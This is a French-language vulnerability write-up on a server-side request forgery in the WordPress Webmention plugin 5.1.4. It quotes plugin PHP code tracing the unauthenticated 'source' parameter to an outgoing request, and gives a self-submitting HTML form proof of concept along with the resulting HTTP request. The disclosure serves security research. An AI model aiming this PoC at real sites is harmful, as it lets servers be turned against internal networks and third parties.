---
title: "SSRF dans le plugin Wordpress Webmention"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Webmention](https://wordpress.org/plugins/webmention/) se présente de cette façon :

> A Webmention is a notification that one URL links to another. Sending a Webmention is not limited to blog posts, and can be used for additional kinds of content and responses as well.
>
> For example, a response can be an RSVP to an event, an indication that someone “likes” another post, a “bookmark” of another post, and many others. Webmention enables these interactions to happen across different websites, enabling a distributed social web.
> 
> The Webmention plugin supports the Webmention protocol, giving you support for sending and receiving Webmentions. It offers a simple built in presentation.

Le mécanisme de Webmention est très similaire à un pingback et comme souvent avec ce type de fonctionnalité, il est vulnérable à un Server Side Request Forgery (SSRF).

La version testée est la 5.1.4 et date d'il y a un mois au moment de ces lignes.

## La vulnérabilité


Le script `includes/class-receiver.php` est inclus par le script principal `webmention.php`.

On y trouve une classe qui déclare différents hooks : 

```php
/**             
 * Webmention Receiver Class
 *      
 * @author Matthias Pfefferle
 */     
class Receiver {
        /**             
         * Initialize the plugin, registering WordPress hooks
         */     
        public static function init() {
                // Configure the REST API route
                add_action( 'rest_api_init', array( static::class, 'register_routes' ) );
                // Filter the response to allow a Webmention form if no parameters are passed
                add_filter( 'rest_pre_serve_request', array( static::class, 'serve_request' ), 11, 4 );
                                        
                add_filter( 'duplicate_comment_id', array( static::class, 'disable_wp_check_dupes' ), 20, 2 );
                                        
                // Webmention helper
                add_filter( 'webmention_comment_data', array( static::class, 'webmention_verify' ), 11, 1 );
                add_filter( 'webmention_comment_data', array( static::class, 'check_dupes' ), 12, 1 );
                                        
                // Webmention data handler
                add_filter( 'webmention_comment_data', array( static::class, 'default_commentdata' ), 21, 1 );
                        
                add_filter( 'pre_comment_approved', array( static::class, 'auto_approve' ), 11, 2 );
        
                // Support Webmention delete
                add_action( 'webmention_data_error', array( static::class, 'delete' ) );

                self::register_meta();
        }
```

Les plus importants concernant la vulnérabilité sont `rest_api_init` qui indiquent d'appeler `register_routes` à l'initialisation de l'API REST et `webmention_comment_data` qui se charge d'appeler `webmention_verify`.

La première méthode est assez simple :

```php
/**
 * Register the Route.
 */
public static function register_routes() {
        register_rest_route(
                'webmention/1.0',
                '/endpoint',
                array(
                        array(
                                'methods'             => WP_REST_Server::CREATABLE,
                                'callback'            => array( static::class, 'post' ),
                                'args'                => self::request_parameters(),
                                'permission_callback' => '__return_true',
                        ),
                        array(
                                'methods'             => WP_REST_Server::READABLE,
                                'callback'            => array( static::class, 'get' ),
                                'permission_callback' => '__return_true',
                        ),
                )
        );
}
```

On y voit la déclaration de la route `webmention/1.0` qui sera traitée par la méthode `post()` de la classe `Receiver`.

Cette méthode est assez longue et effectue tout un tas d'opérations. Les commentaires sont aussi bien utiles :


```php
/**
 * POST Callback for the Webmention endpoint.
 *
 * Returns the response.
 *      
 * @param WP_REST_Request $request Full data about the request.
 *      
 * @return WP_Error|WP_REST_Response
 *              
 * @uses apply_filters calls "webmention_comment_data" on the comment data
 * @uses apply_filters calls "webmention_update" on the comment data 
 * @uses apply_filters calls "webmention_success_message" on the success message
 */                     
public static function post( $request ) {
        $source = $request->get_param( 'source' );
        $target = $request->get_param( 'target' );
        $vouch  = $request->get_param( 'vouch' );
        
        if ( ! stristr( $target, preg_replace( '/^https?:\/\//i', '', home_url() ) ) ) {
                return new WP_Error( 'target_mismatching_domain', esc_html__( 'Target is not on this domain', 'webmention' ), array( 'status' => 400 ) );
        }
        
        $comment_post_id = webmention_url_to_postid( $target );
        --- snip ---
        /**
         * Filter Comment Data for Webmentions.
         *
         * All verification functions and content generation functions are added to the comment data.
         *
         * @param array $commentdata
         *
         * @return array|null|WP_Error $commentdata The Filtered Comment Array or a WP_Error object.
         */
         $commentdata = apply_filters( 'webmention_comment_data', $commentdata );
        --- snip ---
```

Via l'application des filtres `webmention_comment_data` sur `$commentdata`, le hook défini au début va appeler `webmention_verify`.

Cette fonction est la suivante :

```php
/**
 * Verify a Webmention and either return an error if not verified or return the array with retrieved
 * data.
 *
 * @param array $data {
 *     $comment_type
 *     $comment_author_url
 *     $comment_author_IP
 *     $target
 * }
 *
 * @return array|WP_Error $data Return Error Object or array with added fields {
 *     $remote_source
 *     $remote_source_original
 *     $content_type
 * }
 *
 * @uses apply_filters calls "http_headers_useragent" on the user agent
 */
public static function webmention_verify( $data ) {
        if ( ! $data || is_wp_error( $data ) ) {
                return $data;
        }

        if ( ! is_array( $data ) || empty( $data ) ) {
                return new WP_Error( 'invalid_data', esc_html__( 'Invalid data passed', 'webmention' ), array( 'status' => 500 ) );
        }
        
        $response = Request::get( $data['source'] );
        --- snip ---
```

On voit ici qu'une requête HTTP est initiée vers l'adresse définie dans `$data['source']` correspondant au paramètre `source` récupéré par `post()`.

Voici un PoC sous forme de formulaire HTML qui s'auto-submit :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/index.php?rest_route=%2Fwebmention%2F1.0%2Fendpoint">
        <input type="hidden" name="source" value="http://perdu.com/" />
        <input type="hidden" name="submit" value="Ping me!" />
        <input type="hidden" name="format" value="html" />
        <input type="hidden" name="target" value="http://localhost:8000/?p=1" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```

Ici, il génère une requête HTTP à destination de `perdu.com` :

```http
GET / HTTP/1.1
Host: perdu.com
User-Agent: WordPress/6.3.1; http://localhost:8000; Webmention
Accept: */*
Accept-Encoding: deflate, gzip, br
Connection: close
```

L'exploitation est rendue triviale par la présence d'un formulaire que le plugin ajoute en bas de chaque billet du Wordpress :

```html
<form id="webmention-form" action="http://localhost:8000/index.php?rest_route=/webmention/1.0/endpoint" method="post">
	<p>
		<label for="webmention-source">To respond on your own website, enter the URL of your response which should contain a link to this post&#8217;s permalink URL. Your response will then appear (possibly after moderation) on this page. Want to update or remove your response? Update or delete your post and re-enter your post&#8217;s URL again. (<a href="https://indieweb.org/webmention">Learn More</a>)</label>
	</p>
	<p>
		<input id="webmention-source" type="url" autocomplete="url" required pattern="^https?:\/\/(.*)" name="source" placeholder="URL/Permalink of your article" />
	</p>
	<p>
		<input id="webmention-submit" type="submit" name="submit" value="Ping me!" />
	</p>
	<input id="webmention-format" type="hidden" name="format" value="html" />
	<input id="webmention-target" type="hidden" name="target" value="http://localhost:8000/?p=1" />
</form>
```

En bref il suffit de saisir l'URL et de clicker sur `Ping me!`. La réponse de la requête HTTP n'est pas affichée par le plugin toutefois ce dernier donne un retour différent s'il est parvenu ou non à pinger le site. 
